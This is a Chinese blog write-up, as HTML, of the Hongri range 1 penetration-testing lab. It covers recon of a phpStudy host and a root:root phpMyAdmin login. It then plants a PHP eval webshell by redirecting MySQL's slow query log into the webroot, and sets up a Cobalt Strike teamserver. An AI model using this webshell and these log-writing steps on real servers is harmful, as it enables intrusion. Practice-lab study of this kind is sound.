@@ -1,0 +1,861 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"sun-zzz.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":200,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="phpMyadmin后台getshell、令牌窃取提权、Win32k 特权提升漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红日靶场1">
+<meta property="og:url" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1.html">
+<meta property="og:site_name" content="rev1ve&#39;s blog">
+<meta property="og:description" content="phpMyadmin后台getshell、令牌窃取提权、Win32k 特权提升漏洞">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/1.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240716235640022.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240716235743765.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717000529082.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240710105732552.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240716235824459.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240716235848452.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240710111021184.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240710111248198.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240710111529927.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240710111905892.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240710112310348.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240710182754781.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240710183352428.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240710183556723.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240710183916873.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240710184634080.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240716113154008.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240716113459685.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240716114406682.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240716115257709.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717105803656.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717105916666.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717110034983.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717110212036.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717110513637.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717110603730.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717110954825.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717111231214.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717133735976.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717135102643.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717111348584.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717112013366.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717112603302.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717112931140.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717113124605.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717120313607.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717175935391.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717123542185.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717122011356.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717122122602.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717123253998.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717124846523.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717144635784.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717125753858.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717142743288.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717142829861.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717135529818.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717142553417.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717143031547.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717143334195.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717185353040.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717185801850.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717190216486.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717190625098.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717190807401.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717190914990.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718113239163.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718113531008.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718113839978.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718120946317.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718120659776.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718183923147.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718184600701.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718185518980.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718192049466.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718192231428.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718192345127.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718195213356.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718195748044.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718202222895.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718202313891.png">
+<meta property="article:published_time" content="2024-07-18T02:24:40.000Z">
+<meta property="article:modified_time" content="2024-08-03T03:56:58.170Z">
+<meta property="article:author" content="rev1ve">
+<meta property="article:tag" content="靶场">
+<meta property="article:tag" content="域渗透">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/1.png">
+
+<link rel="canonical" href="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>红日靶场1 | rev1ve's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">rev1ve's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links" rel="section"><i class="fas fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sun-zzz.github.io/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="rev1ve">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="rev1ve's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          红日靶场1
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-07-18 10:24:40" itemprop="dateCreated datePublished" datetime="2024-07-18T10:24:40+08:00">2024-07-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-08-03 11:56:58" itemprop="dateModified" datetime="2024-08-03T11:56:58+08:00">2024-08-03</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1.html" class="post-meta-item leancloud_visitors" data-flag-title="红日靶场1" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>phpMyadmin后台getshell、令牌窃取提权、Win32k 特权提升漏洞</p>
+<span id="more"></span>
+
+<h1 id="红日靶场1"><a href="#红日靶场1" class="headerlink" title="红日靶场1"></a>红日靶场1</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>整体配置图如下</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/1.png"></p>
+<p>现在为三台靶机配置网卡</p>
+<p>打开vm找到左上角<code>编辑—&gt;虚拟网络编辑器</code>添加一段虚拟网络VMnet2，设置为仅主机</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240716235640022.png"></p>
+<h3 id="配置攻击机kali"><a href="#配置攻击机kali" class="headerlink" title="配置攻击机kali"></a>配置攻击机kali</h3><p>这里使用我自己虚拟机的kali作为攻击机，添加网络适配器，设置为双网卡NAT，vm1</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240716235743765.png"></p>
+<p>不过这里配置好后执行<code>ifconfig</code>后，并没有分配vm1网段的ip</p>
+<p>手动添加一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ip addr add 192.168.80.10/24 dev eth1            #分配ip</span><br><span class="line">sudo ip route add default via 192.168.80.1            #设置默认网关</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717000529082.png"></p>
+<h3 id="配置win7-x64"><a href="#配置win7-x64" class="headerlink" title="配置win7 x64"></a>配置win7 x64</h3><p>设置<code>win7 x64</code>为双网卡vm1，vm2</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240710105732552.png"></p>
+<h3 id="配置win2008"><a href="#配置win2008" class="headerlink" title="配置win2008"></a>配置win2008</h3><p>设置<code>win2008</code>为单网卡vm2</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240716235824459.png"></p>
+<h3 id="配置win2k3"><a href="#配置win2k3" class="headerlink" title="配置win2k3"></a>配置win2k3</h3><p>设置<code>win2k3</code>为单网卡vm2</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240716235848452.png"></p>
+<h3 id="启动phpstudy服务"><a href="#启动phpstudy服务" class="headerlink" title="启动phpstudy服务"></a>启动phpstudy服务</h3><p>打开<code>win7 x64</code>，用<code>hongrisec@2019</code>密码进行登录（三台靶机密码相同）</p>
+<p>找到<code>C:\phpStudy</code>的phpstudy后启动服务，结果发现phpstudy停止工作</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240710111021184.png"></p>
+<p>去网上搜了下找到解决办法，升级下虚拟机就行了</p>
+<p>我这里选择最新的16.2版本</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240710111248198.png"></p>
+<p>然后点击更改此虚拟机</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240710111529927.png"></p>
+<p>升级好后重新打开<code>win7 x64</code>，成功启动服务</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240710111905892.png"></p>
+<p>访问<code>localhost/yxcms</code>，出现下图说明搭建成功</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240710112310348.png"></p>
+<p><strong>注意：在渗透过程中所有主机都需要打开</strong></p>
+<hr>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>用nmap扫描一下端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -v 192.168.80.128</span><br></pre></td></tr></table></figure>
+
+<p>扫描结果如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE</span><br><span class="line">80/tcp   open  http</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-title: phpStudy \xE6\x8E\xA2\xE9\x92\x88 2014 </span><br><span class="line">3306/tcp open  mysql</span><br></pre></td></tr></table></figure>
+
+<p>存在80端口我们直接访问</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240710182754781.png"></p>
+<p>dirsearch扫一下目录，忽略掉403</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.80.128/ -x 403</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240710183352428.png"></p>
+<h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><p>扫出来发现有<code>/phpMyadmin</code>，访问用<code>root:root</code>成功登录</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240710183556723.png"></p>
+<p>我们先看看是否有限制目录读写</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%secure_file_priv%&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240710183916873.png"></p>
+<p>如果为null的话表示不允许数据的导入和导出，那么无法进行写文件和读文件</p>
+<p>这里可以利用慢日志来写shell，我们先查看慢日志是否被启用以及日志文件的位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%slow_query_log%&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240710184634080.png"></p>
+<p>我们写shell的话，这里需要开启慢查询并且修改日志文件存放路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set global slow_query_log=1;</span><br><span class="line">set global slow_query_log_file=&#x27;C:\\phpStudy\\WWW\\shell.php&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>然后执行查询语句，把一句话木马写到shell.php里</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; or sleep(11);</span><br><span class="line">#sleep时间要超过最大限制（也就是10秒）才生效</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240716113154008.png"></p>
+<p>写完shell后用蚁剑连接</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240716113459685.png"></p>
+<p>我们右键在此处打开终端</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240716114406682.png"></p>
+<p>先看看是否存在杀软程序</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /SVC</span><br></pre></td></tr></table></figure>
+
+<p>将执行结果复制到<a target="_blank" rel="noopener" href="https://www.ddosi.org/av/1.php">在线网站</a>查询一下</p>
+<p>可以看到这台机子没有杀软，那么就简单多了</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240716115257709.png"></p>
+<h2 id="打法一"><a href="#打法一" class="headerlink" title="打法一"></a>打法一</h2><h3 id="联动蚁剑上线cs"><a href="#联动蚁剑上线cs" class="headerlink" title="联动蚁剑上线cs"></a>联动蚁剑上线cs</h3><p>我们直接联动蚁剑上线cs，在cs文件夹打开终端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x teamserver                  #给予服务端程序teamserver 执行权限</span><br><span class="line">./teamserver 192.168.80.10 root      #运行服务端程序，192.168.80.10是本机IP，root是要设置的连接密码</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717105803656.png"></p>
+<p>开启服务端后，新建终端输入以下命令运行客户端程序</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar</span><br></pre></td></tr></table></figure>
+
+<p>新建配置文件，连接CS服务器</p>
+<p>(主机和密码就是刚刚设置的，用户名随便填一个)</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717105916666.png"></p>
+<p>客户端启动成功后，右上角添加本地监听器</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717110034983.png"></p>
